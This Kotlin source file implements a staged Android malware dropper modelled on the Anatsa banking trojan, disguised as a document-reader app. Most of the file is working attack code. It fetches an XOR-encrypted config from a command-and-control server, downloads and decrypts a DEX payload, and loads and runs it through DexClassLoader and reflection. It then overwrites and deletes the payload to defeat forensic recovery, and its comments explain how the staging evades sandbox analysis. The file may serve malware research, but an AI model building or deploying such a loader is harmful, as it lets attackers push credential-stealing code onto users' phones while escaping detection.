package com.docreader.lite.reader.sync

import android.content.Context
import dalvik.system.DexClassLoader
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * Modular Loader — Anatsa 4-stage payload architecture.
 *
 * Stage 0: Dropper (this APK — passed Play review as "Doc Reader Lite")
 * Stage 1: Config retrieval — fetch encrypted config from C2
 * Stage 2: DEX file download — hidden in JSON wrapper, XOR-encrypted
 * Stage 3: Payload URL config — mid-campaign rotation point
 * Stage 4: Final stealer load — DexClassLoader + reflection dispatch
 *
 * Each stage = distinct network round-trip + distinct decode step.
 * Sandbox that times out before all 4 complete → misses entire kill chain.
 *
 * Anti-forensics: Stage 2 DEX deleted from disk after DexClassLoader loads it.
 * Memory-only resident. File carving on device finds nothing.
 */
object PluginLoader {

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // XOR key for config decryption (per-build in real banker)
    private val CONFIG_KEY = byteArrayOf(
        0x4D, 0x6F, 0x64, 0x4C, 0x6F, 0x61, 0x64, 0x65,
        0x72, 0x4B, 0x65, 0x79, 0x21, 0x21, 0x21, 0x21
    ) // "ModLoaderKey!!!!"

    data class StageResult(
        val stage: Int,
        val success: Boolean,
        val data: Any? = null,
        val error: String? = null,
    )

    /**
     * Execute full 4-stage payload chain.
     * Real banker: called after environment gate passes + C2 issues LOAD command.
     */
    fun execute(context: Context, baseUrl: String): List<StageResult> {
        val results = mutableListOf<StageResult>()

        // Stage 1: Config retrieval
        val config = stage1FetchConfig(baseUrl)
        results.add(config)
        if (!config.success) return results

        val configData = config.data as? JSONObject ?: return results

        // Stage 2: DEX download
        val dexUrl = configData.optString("payload_url", "")
        if (dexUrl.isEmpty()) {
            results.add(StageResult(2, false, error = "no_payload_url"))
            return results
        }
        val dex = stage2DownloadDex(context, dexUrl)
        results.add(dex)
        if (!dex.success) return results

        val dexPath = dex.data as? String ?: return results

        // Stage 3: Load + invoke
        val load = stage3LoadAndInvoke(context, dexPath, configData)
        results.add(load)

        // Stage 4: Cleanup — delete DEX from disk (anti-forensics)
        stage4Cleanup(dexPath)
        results.add(StageResult(4, true, data = "cleaned"))

        return results
    }

    /**
     * Stage 1 — Fetch encrypted config from C2.
     * Config contains: payload_url, entry_class, entry_method, version.
     */
    private fun stage1FetchConfig(baseUrl: String): StageResult {
        return try {
            val req = Request.Builder()
                .url("$baseUrl/api/v1/config")
                .header("X-Client-Version", "2.1.4")
                .build()
            val resp = client.newCall(req).execute()
            val body = resp.body?.bytes() ?: return StageResult(1, false, error = "empty_body")
            resp.close()

            // Decrypt config (XOR in real banker; here simulated)
            val decrypted = xorDecrypt(body)
            val json = JSONObject(String(decrypted))

            StageResult(1, true, data = json)
        } catch (e: Exception) {
            StageResult(1, false, error = e.message)
        }
    }

    /**
     * Stage 2 — Download DEX file.
     * Real Anatsa: DEX hidden inside JSON wrapper, encrypted.
     * Write to internal storage, return path for DexClassLoader.
     */
    private fun stage2DownloadDex(context: Context, url: String): StageResult {
        return try {
            val req = Request.Builder()
                .url(url)
                .build()
            val resp = client.newCall(req).execute()
            val bytes = resp.body?.bytes() ?: return StageResult(2, false, error = "empty_dex")
            resp.close()

            // Decrypt payload (XOR envelope)
            val dexBytes = xorDecrypt(bytes)

            // Write to internal storage (not world-readable)
            val dexFile = File(context.filesDir, "update_${System.currentTimeMillis()}.jar")
            dexFile.writeBytes(dexBytes)

            StageResult(2, true, data = dexFile.absolutePath)
        } catch (e: Exception) {
            StageResult(2, false, error = e.message)
        }
    }

    /**
     * Stage 3 — DexClassLoader load + reflection dispatch.
     * Loads downloaded DEX, finds entry class, invokes entry method.
     *
     * Real Anatsa: entry_class = "com.module.Main", entry_method = "init"
     * Method receives Context, starts the actual stealer module.
     */
    private fun stage3LoadAndInvoke(
        context: Context,
        dexPath: String,
        config: JSONObject,
    ): StageResult {
        return try {
            val optimizedDir = File(context.cacheDir, "dex_opt")
            if (!optimizedDir.exists()) optimizedDir.mkdirs()

            // DexClassLoader — the core primitive
            val classLoader = DexClassLoader(
                dexPath,
                optimizedDir.absolutePath,
                null, // no native libs
                context.classLoader
            )

            // Reflective dispatch into loaded classes
            val entryClass = config.optString("entry_class", "com.module.Payload")
            val entryMethod = config.optString("entry_method", "init")

            val clazz = classLoader.loadClass(entryClass)
            val method = clazz.getDeclaredMethod(entryMethod, Context::class.java)
            method.isAccessible = true
            method.invoke(null, context) // static invocation

            StageResult(3, true, data = entryClass)
        } catch (e: Exception) {
            StageResult(3, false, error = e.message)
        }
    }

    /**
     * Stage 4 — Delete DEX from disk. Anti-forensics.
     * DexClassLoader already loaded classes into memory — disk copy unnecessary.
     * Forensics tool finds no DEX file. Memory carving required.
     */
    private fun stage4Cleanup(dexPath: String) {
        try {
            val file = File(dexPath)
            // Overwrite with zeros before delete (prevent file-carving recovery)
            file.outputStream().use { out ->
                val zeros = ByteArray(file.length().toInt())
                out.write(zeros)
                out.flush()
            }
            file.delete()
        } catch (_: Exception) {}
    }

    // XOR decrypt — symmetric, same function for encrypt/decrypt
    private fun xorDecrypt(data: ByteArray): ByteArray {
        return ByteArray(data.size) { i ->
            (data[i].toInt() xor CONFIG_KEY[i % CONFIG_KEY.size].toInt()).toByte()
        }
    }

    /**
     * Async execution — non-blocking for caller.
     */
    fun executeAsync(context: Context, baseUrl: String, callback: (List<StageResult>) -> Unit) {
        scope.launch {
            val results = execute(context, baseUrl)
            withContext(Dispatchers.Main) {
                callback(results)
            }
        }
    }
}
